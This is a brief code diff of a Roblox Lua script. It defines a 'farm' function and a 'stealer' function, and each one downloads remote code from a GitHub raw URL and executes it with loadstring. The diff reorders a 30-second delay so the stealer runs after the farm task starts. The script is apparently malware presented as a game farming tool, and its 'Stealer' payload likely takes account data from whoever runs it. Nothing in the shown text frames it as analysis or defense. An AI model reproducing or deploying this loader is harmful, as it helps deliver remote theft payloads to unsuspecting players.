@@ -1,10 +1,10 @@
 local function farm()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/New'))()
 end
-wait(30)
 local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/NewScripts/refs/heads/main/Stealer'))()
 end
 
 task.spawn(farm)
+wait(30)
 task.spawn(stealer)
